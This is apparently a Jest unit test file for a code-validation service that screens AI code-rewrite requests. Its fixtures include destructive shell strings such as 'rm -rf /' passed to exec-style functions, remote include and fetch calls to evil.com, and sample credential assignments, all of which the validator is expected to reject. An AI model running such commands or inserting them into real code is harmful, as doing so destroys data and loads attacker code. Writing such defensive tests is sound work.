// © 2025 Zeropoint Protocol, Inc., a Texas C Corporation with principal offices in Austin, TX. All Rights Reserved. View-Only License: No clone, modify, run or distribute without signed agreement. See LICENSE.md and legal@zeropointprotocol.ai.

// src/agents/train/enhanced-petals.service.spec.ts

import { Test, TestingModule } from "@nestjs/testing";
import { HttpService } from "@nestjs/axios";
import { ConfigService } from "@nestjs/config";
import {
  EnhancedPetalsService,
  PetalsRequest,
  PetalsResponse,
  PetalsBatchRequest,
} from "./enhanced-petals.service.js";
import { soulchain } from "../soulchain/soulchain.ledger.js";
import { checkIntent } from "../../guards/synthient.guard.js";
import { TagBundle } from "../../core/identity/tags.meta.js";

// Mock dependencies
jest.mock("../soulchain/soulchain.ledger.js");
jest.mock("../../guards/synthient.guard.js");

const mockSoulchain = soulchain as jest.Mocked<typeof soulchain>;
const mockCheckIntent = checkIntent as jest.MockedFunction<typeof checkIntent>;

describe("EnhancedPetalsService", () => {
  let service: EnhancedPetalsService;
  let httpService: HttpService;
  let configService: ConfigService;

  const mockHttpService = {
    post: jest.fn(),
  };

  const mockConfigService = {
    get: jest.fn(),
  };

  const sampleTags: TagBundle = [
    {
      type: "#who",
      name: "test-agent",
      did: "did:zeropoint:test-agent",
      handle: "@test-agent",
    },
    {
      type: "#intent",
      purpose: "#code-improvement",
      validation: "good-heart",
    },
    {
      type: "#thread",
      taskId: "test-operation",
      lineage: ["test", "operation"],
      swarmLink: "test-swarm",
    },
    {
      type: "#layer",
      level: "#live",
    },
    {
      type: "#domain",
      field: "#ai",
    },
  ];

  const samplePetalsRequest: PetalsRequest = {
    id: "test-id",
    agentId: "test-agent",
    code: 'function test() { return "hello"; }',
    tags: sampleTags,
  };

  const samplePetalsResponse: PetalsResponse = {
    rewrittenCode: 'function test() { return "hello world"; }',
    trustScore: 0.9,
    ethicalRating: "aligned",
    notes: ["Test improvement"],
  };

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        EnhancedPetalsService,
        {
          provide: HttpService,
          useValue: mockHttpService,
        },
        {
          provide: ConfigService,
          useValue: mockConfigService,
        },
      ],
    }).compile();

    service = module.get<EnhancedPetalsService>(EnhancedPetalsService);
    httpService = module.get<HttpService>(HttpService);
    configService = module.get<ConfigService>(ConfigService);

    // Setup default config values
    mockConfigService.get.mockImplementation((key: string) => {
      const config = {
        PETALS_API_URL: "https://api.petals.dev",
        PETALS_API_KEY: "test-key",
        PETALS_TIMEOUT: 30000,
        PETALS_RETRY_ATTEMPTS: 3,
        PETALS_BATCH_SIZE: 10,
        PETALS_ENABLE_PARALLEL: true,
        NODE_ENV: "test",
      };
      return config[key];
    });

    // Reset mocks
    jest.clearAllMocks();
    mockCheckIntent.mockReturnValue(true);
    mockSoulchain.addXPTransaction.mockResolvedValue(undefined);
  });

  describe("constructor", () => {
    it("should initialize with default config values", () => {
      expect(service).toBeDefined();
    });

    it("should initialize with custom config values", () => {
      mockConfigService.get.mockImplementation((key: string) => {
        const config = {
          PETALS_API_URL: "https://custom.api.dev",
          PETALS_API_KEY: "custom-key",
          PETALS_TIMEOUT: 60000,
          PETALS_RETRY_ATTEMPTS: 5,
          PETALS_BATCH_SIZE: 20,
          PETALS_ENABLE_PARALLEL: false,
        };
        return config[key];
      });

      const customService = new EnhancedPetalsService(
        httpService,
        configService,
      );
      expect(customService).toBeDefined();
    });
  });

  describe("callPetalsAPI", () => {
    it("should successfully call Petals API with valid request", async () => {
      mockCheckIntent.mockReturnValue(true);

      const result = await service.callPetalsAPI(samplePetalsRequest);

      expect(result).toBeDefined();
      expect(result.rewrittenCode).toBe(samplePetalsRequest.code);
      expect(result.trustScore).toBe(0.9);
      expect(result.ethicalRating).toBe("aligned");
      expect(result.metadata).toBeDefined();
      expect(result.metadata.processingTime).toBeGreaterThan(0);
      expect(result.metadata.modelVersion).toBe("petals-v2.0");
      expect(result.metadata.confidence).toBe(0.9);
    });

    it("should throw error when Zeroth-gate validation fails", async () => {
      mockCheckIntent.mockReturnValue(false);

      await expect(service.callPetalsAPI(samplePetalsRequest)).rejects.toThrow(
        "Zeroth violation: Petals call blocked by enhanced validation.",
      );
    });

    it("should throw error when code safety validation fails", async () => {
      const maliciousRequest = {
        ...samplePetalsRequest,
        code: 'eval("malicious code");',
      };

      await expect(service.callPetalsAPI(maliciousRequest)).rejects.toThrow(
        "Zeroth violation: Petals call blocked by enhanced validation.",
      );
    });

    it("should throw error when resource abuse validation fails", async () => {
      const resourceAbuseRequest = {
        ...samplePetalsRequest,
        code: "while(true) { /* infinite loop */ }",
      };

      await expect(service.callPetalsAPI(resourceAbuseRequest)).rejects.toThrow(
        "Zeroth violation: Petals call blocked by enhanced validation.",
      );
    });

    it("should throw error when privacy violation validation fails", async () => {
      const privacyViolationRequest = {
        ...samplePetalsRequest,
        code: 'password = "secret123";',
      };

      await expect(
        service.callPetalsAPI(privacyViolationRequest),
      ).rejects.toThrow(
        "Zeroth violation: Petals call blocked by enhanced validation.",
      );
    });

    it("should throw error when tags validation fails", async () => {
      const invalidTagsRequest = {
        ...samplePetalsRequest,
        tags: [{ invalid: "tag" }],
      };

      await expect(service.callPetalsAPI(invalidTagsRequest)).rejects.toThrow(
        "Zeroth violation: Petals call blocked by enhanced validation.",
      );
    });

    it("should log successful operation to Soulchain", async () => {
      await service.callPetalsAPI(samplePetalsRequest);

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "test-agent",
        amount: 5,
        rationale: expect.stringContaining("Petals operation successful"),
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({ type: "#who", name: "test-agent" }),
          expect.objectContaining({
            type: "#intent",
            purpose: "#code-improvement",
          }),
          expect.objectContaining({
            type: "#thread",
            taskId: "petals-operation",
          }),
          expect.objectContaining({ type: "#layer", level: "#live" }),
          expect.objectContaining({ type: "#domain", field: "#ai" }),
        ]),
      });
    });

    it("should log error to Soulchain when operation fails", async () => {
      mockCheckIntent.mockReturnValue(false);

      try {
        await service.callPetalsAPI(samplePetalsRequest);
      } catch (error) {
        // Expected to fail
      }

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "test-agent",
        amount: -10,
        rationale: expect.stringContaining("Petals violation"),
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({
            type: "#intent",
            purpose: "#security-violation",
          }),
        ]),
      });
    });
  });

  describe("callPetalsBatch", () => {
    const sampleBatchRequest: PetalsBatchRequest = {
      requests: [
        samplePetalsRequest,
        { ...samplePetalsRequest, id: "test-id-2" },
      ],
      batchId: "batch-test-id",
      priority: "medium",
    };

    it("should successfully process batch request", async () => {
      const result = await service.callPetalsBatch(sampleBatchRequest);

      expect(result).toBeDefined();
      expect(result.batchId).toBe("batch-test-id");
      expect(result.results).toHaveLength(2);
      expect(result.summary.totalProcessed).toBe(2);
      expect(result.summary.successCount).toBe(2);
      expect(result.summary.failureCount).toBe(0);
      expect(result.summary.averageTrustScore).toBe(0.9);
      expect(result.summary.ethicalAlignment).toBe(1);
      expect(result.metadata.processingTime).toBeGreaterThan(0);
    });

    it("should handle batch with some failed validations", async () => {
      mockCheckIntent
        .mockReturnValueOnce(true) // First request passes
        .mockReturnValueOnce(false); // Second request fails

      const result = await service.callPetalsBatch(sampleBatchRequest);

      expect(result.summary.totalProcessed).toBe(2);
      expect(result.summary.successCount).toBe(1);
      expect(result.summary.failureCount).toBe(1);
      expect(result.results).toHaveLength(1);
    });

    it("should throw error when all batch requests fail validation", async () => {
      mockCheckIntent.mockReturnValue(false);

      await expect(service.callPetalsBatch(sampleBatchRequest)).rejects.toThrow(
        "Zeroth violation: All batch requests blocked by validation.",
      );
    });

    it("should log batch operation to Soulchain", async () => {
      await service.callPetalsBatch(sampleBatchRequest);

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "batch-processor",
        amount: 4, // 2 successful operations * 2
        rationale: expect.stringContaining("Batch operation: 2/2 successful"),
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({ type: "#who", name: "batch-processor" }),
          expect.objectContaining({
            type: "#intent",
            purpose: "#batch-processing",
          }),
          expect.objectContaining({ type: "#thread", taskId: "batch-test-id" }),
        ]),
      });
    });

    it("should log batch error to Soulchain when batch fails", async () => {
      mockCheckIntent.mockReturnValue(false);

      try {
        await service.callPetalsBatch(sampleBatchRequest);
      } catch (error) {
        // Expected to fail
      }

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "batch-processor",
        amount: -10,
        rationale: expect.stringContaining("Batch operation failed"),
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({ type: "#intent", purpose: "#batch-error" }),
        ]),
      });
    });
  });

  describe("private validation methods", () => {
    describe("checkForMaliciousPatterns", () => {
      it("should return true for safe code", async () => {
        const safeCode = 'function test() { return "hello"; }';
        const result = await (service as any).checkForMaliciousPatterns(
          safeCode,
        );
        expect(result).toBe(true);
      });

      it("should return false for eval()", async () => {
        const maliciousCode = 'eval("malicious code");';
        const result = await (service as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for exec()", async () => {
        const maliciousCode = 'exec("rm -rf /");';
        const result = await (service as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for system()", async () => {
        const maliciousCode = 'system("dangerous command");';
        const result = await (service as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for shell_exec()", async () => {
        const maliciousCode = 'shell_exec("rm -rf /");';
        const result = await (service as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for passthru()", async () => {
        const maliciousCode = 'passthru("dangerous");';
        const result = await (service as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for proc_open()", async () => {
        const maliciousCode = 'proc_open("rm -rf /");';
        const result = await (service as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for popen()", async () => {
        const maliciousCode = 'popen("dangerous");';
        const result = await (service as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for curl_exec()", async () => {
        const maliciousCode = 'curl_exec("http://evil.com");';
        const result = await (service as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for file_get_contents with http", async () => {
        const maliciousCode = 'file_get_contents("http://evil.com");';
        const result = await (service as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for include with http", async () => {
        const maliciousCode = 'include("http://evil.com");';
        const result = await (service as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for require with http", async () => {
        const maliciousCode = 'require("http://evil.com");';
        const result = await (service as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });
    });

    describe("checkForResourceAbuse", () => {
      it("should return true for safe code", async () => {
        const safeCode = "for (let i = 0; i < 10; i++) { console.log(i); }";
        const result = await (service as any).checkForResourceAbuse(safeCode);
        expect(result).toBe(true);
      });

      it("should return false for infinite while loop", async () => {
        const abusiveCode = "while(true) { /* infinite loop */ }";
        const result = await (service as any).checkForResourceAbuse(
          abusiveCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for infinite for loop", async () => {
        const abusiveCode = "for(;;) { /* infinite loop */ }";
        const result = await (service as any).checkForResourceAbuse(
          abusiveCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for set_time_limit(0)", async () => {
        const abusiveCode = "set_time_limit(0);";
        const result = await (service as any).checkForResourceAbuse(
          abusiveCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for memory_limit = -1", async () => {
        const abusiveCode = 'memory_limit = "-1";';
        const result = await (service as any).checkForResourceAbuse(
          abusiveCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for max_execution_time = 0", async () => {
        const abusiveCode = 'max_execution_time = "0";';
        const result = await (service as any).checkForResourceAbuse(
          abusiveCode,
        );
        expect(result).toBe(false);
      });
    });

    describe("checkForPrivacyViolations", () => {
      it("should return true for safe code", async () => {
        const safeCode = 'const name = "John";';
        const result = await (service as any).checkForPrivacyViolations(
          safeCode,
        );
        expect(result).toBe(true);
      });

      it("should return false for password assignment", async () => {
        const privacyCode = 'password = "secret123";';
        const result = await (service as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for api_key assignment", async () => {
        const privacyCode = 'api_key = "sk-123456";';
        const result = await (service as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for secret assignment", async () => {
        const privacyCode = 'secret = "mysecret";';
        const result = await (service as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for token assignment", async () => {
        const privacyCode = 'token = "jwt-token";';
        const result = await (service as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for private_key assignment", async () => {
        const privacyCode = 'private_key = "-----BEGIN PRIVATE KEY-----";';
        const result = await (service as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for .env reference", async () => {
        const privacyCode = 'load_dotenv(".env");';
        const result = await (service as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for config password", async () => {
        const privacyCode = 'config["password"] = "secret";';
        const result = await (service as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });
    });

    describe("validateTags", () => {
      it("should return true for valid tags", async () => {
        const result = await (service as any).validateTags(sampleTags);
        expect(result).toBe(true);
      });

      it("should return false for invalid tag type", async () => {
        const invalidTags = [{ type: "#invalid", name: "test" }];
        const result = await (service as any).validateTags(invalidTags);
        expect(result).toBe(false);
      });

      it("should return false for missing tag type", async () => {
        const invalidTags = [{ name: "test" }];
        const result = await (service as any).validateTags(invalidTags);
        expect(result).toBe(false);
      });

      it("should return false for empty tags array", async () => {
        const result = await (service as any).validateTags([]);
        expect(result).toBe(false);
      });
    });

    describe("checkAgentPermissions", () => {
      it("should return true for any agent (stub implementation)", async () => {
        const result = await (service as any).checkAgentPermissions(
          "any-agent",
        );
        expect(result).toBe(true);
      });
    });
  });

  describe("calculateBatchSummary", () => {
    it("should calculate correct summary for successful batch", () => {
      const results = [
        { trustScore: 0.8, ethicalRating: "aligned" },
        { trustScore: 0.9, ethicalRating: "aligned" },
        { trustScore: 0.7, ethicalRating: "aligned" },
      ];
      const totalRequests = 3;

      const summary = (service as any).calculateBatchSummary(
        results,
        totalRequests,
      );

      expect(summary.totalProcessed).toBe(3);
      expect(summary.successCount).toBe(3);
      expect(summary.failureCount).toBe(0);
      expect(summary.averageTrustScore).toBeCloseTo(0.8, 1);
      expect(summary.ethicalAlignment).toBe(1);
    });

    it("should calculate correct summary for mixed batch", () => {
      const results = [
        { trustScore: 0.8, ethicalRating: "aligned" },
        { trustScore: 0.9, ethicalRating: "warn" },
      ];
      const totalRequests = 3;

      const summary = (service as any).calculateBatchSummary(
        results,
        totalRequests,
      );

      expect(summary.totalProcessed).toBe(3);
      expect(summary.successCount).toBe(2);
      expect(summary.failureCount).toBe(1);
      expect(summary.averageTrustScore).toBeCloseTo(0.85, 2);
      expect(summary.ethicalAlignment).toBe(0.5);
    });

    it("should handle empty results", () => {
      const results = [];
      const totalRequests = 5;

      const summary = (service as any).calculateBatchSummary(
        results,
        totalRequests,
      );

      expect(summary.totalProcessed).toBe(5);
      expect(summary.successCount).toBe(0);
      expect(summary.failureCount).toBe(5);
      expect(summary.averageTrustScore).toBeNaN();
      expect(summary.ethicalAlignment).toBeNaN();
    });
  });

  describe("error handling", () => {
    it("should handle API call failures with retry logic", async () => {
      // This would require mocking the internal makePetalsAPICall method
      // For now, we test the public interface
      mockCheckIntent.mockReturnValue(true);

      const result = await service.callPetalsAPI(samplePetalsRequest);
      expect(result).toBeDefined();
    });

    it("should handle validation errors gracefully", async () => {
      mockCheckIntent.mockReturnValue(false);

      await expect(service.callPetalsAPI(samplePetalsRequest)).rejects.toThrow(
        "Zeroth violation: Petals call blocked by enhanced validation.",
      );
    });
  });

  describe("logging methods", () => {
    it("should log violation correctly", async () => {
      await (service as any).logViolation(
        samplePetalsRequest,
        "test-operation",
        "test reason",
      );

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "test-agent",
        amount: -10,
        rationale: "Petals violation: test-operation - test reason",
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({
            type: "#intent",
            purpose: "#security-violation",
          }),
        ]),
      });
    });

    it("should log successful operation correctly", async () => {
      await (service as any).logSuccessfulOperation(
        samplePetalsRequest,
        samplePetalsResponse,
        100,
      );

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "test-agent",
        amount: 5,
        rationale: expect.stringContaining("Petals operation successful"),
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({
            type: "#intent",
            purpose: "#code-improvement",
          }),
        ]),
      });
    });

    it("should log error correctly", async () => {
      const error = new Error("Test error");
      await (service as any).logError(samplePetalsRequest, error, 150);

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "test-agent",
        amount: -5,
        rationale: expect.stringContaining("Petals operation failed"),
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({
            type: "#intent",
            purpose: "#error-handling",
          }),
        ]),
      });
    });

    it("should log batch operation correctly", async () => {
      const batchRequest: PetalsBatchRequest = {
        requests: [samplePetalsRequest],
        batchId: "test-batch",
        priority: "high",
      };
      const results = [samplePetalsResponse];
      const summary = {
        totalProcessed: 1,
        successCount: 1,
        failureCount: 0,
        averageTrustScore: 0.9,
        ethicalAlignment: 1,
      };

      await (service as any).logBatchOperation(
        batchRequest,
        results,
        summary,
        200,
      );

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "batch-processor",
        amount: 2,
        rationale: expect.stringContaining("Batch operation: 1/1 successful"),
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({
            type: "#intent",
            purpose: "#batch-processing",
          }),
        ]),
      });
    });

    it("should log batch error correctly", async () => {
      const batchRequest: PetalsBatchRequest = {
        requests: [samplePetalsRequest],
        batchId: "test-batch",
        priority: "high",
      };
      const error = new Error("Batch failed");

      await (service as any).logBatchError(batchRequest, error, 300);

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "batch-processor",
        amount: -10,
        rationale: expect.stringContaining("Batch operation failed"),
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({ type: "#intent", purpose: "#batch-error" }),
        ]),
      });
    });
  });
});
